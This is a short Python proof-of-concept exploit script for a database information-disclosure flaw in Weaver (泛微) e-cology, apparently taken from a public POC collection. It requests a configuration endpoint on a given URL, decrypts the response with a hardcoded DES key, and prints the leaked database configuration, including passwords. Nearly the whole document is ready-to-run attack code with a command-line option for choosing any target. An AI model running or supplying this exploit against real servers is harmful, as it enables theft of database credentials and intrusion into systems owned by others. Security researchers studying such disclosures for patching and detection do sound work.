# Written by 辣椒酱
# Date ：2019-10-29
# Uage ：python3 e-cology_disclosure.py -u url
# Source ：https://github.com/Paper-Pen/TimelineSec_POC/tree/master/%E6%B3%9B%E5%BE%AE%E6%BC%8F%E6%B4%9E

from pyDes import *
import sys
import requests
import argparse
class DemoPOC(object):
    def __init__(self, url):
        self.url = url
    references = []
    name = '泛微数据库信息泄露'
    appName = '泛微'
    desc = '''
        泛微数据库信息泄露
    '''
    def _verify(self):
        result = {}
        url = self.url

        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
        }
        try:
            url = url + '/mobile/DBconfigReader.jsp'
            a = str(des('1z2x3c4v').decrypt(requests.get(url=url, headers=headers, timeout=10).content[10:]))
            if "pass" in a:
                print(a)
                result = {
                    "name": DemoPOC.name
                }
        except:
            pass
        return result
if __name__ == '__main__':
    print("泛微信息泄露 -u 指定url")
    url = None
    parser = argparse.ArgumentParser(description="t泛微 -u 指定url")
    parser.add_argument('-u', '--url', default='')
    args = parser.parse_args()
    for i, j in args.__dict__.items():
        if i == "url":
            url = j
    a=DemoPOC(url)
    print(a._verify())
